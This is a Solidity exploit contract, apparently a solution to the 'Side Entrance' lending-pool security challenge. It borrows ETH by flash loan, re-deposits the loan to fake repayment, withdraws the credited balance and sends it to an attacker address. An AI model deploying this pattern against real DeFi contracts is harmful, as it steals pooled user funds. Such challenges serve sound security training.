// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

import "hardhat/console.sol";

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract AttackerContract {
    SideEntranceLenderPool private immutable pool;
    address attacker;

    constructor(address poolAddress, address attackerAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        attacker = payable(attackerAddress);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        payable(attacker).transfer(msg.value);
    }
}
